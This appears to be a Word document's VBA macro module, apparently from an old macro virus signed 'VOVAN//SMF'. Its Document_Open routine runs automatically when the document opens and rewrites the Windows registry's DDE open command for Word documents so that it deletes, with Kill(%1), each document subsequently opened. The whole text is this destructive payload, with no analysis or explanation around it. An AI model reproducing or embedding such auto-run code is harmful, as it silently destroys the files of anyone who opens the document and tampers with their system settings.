   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Open()
   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\Open\ddeexec", "") = "['DDE-Bacteria][On Error Resume Next][Kill(""%1"")]"
   End Sub 'VOVAN//SMF
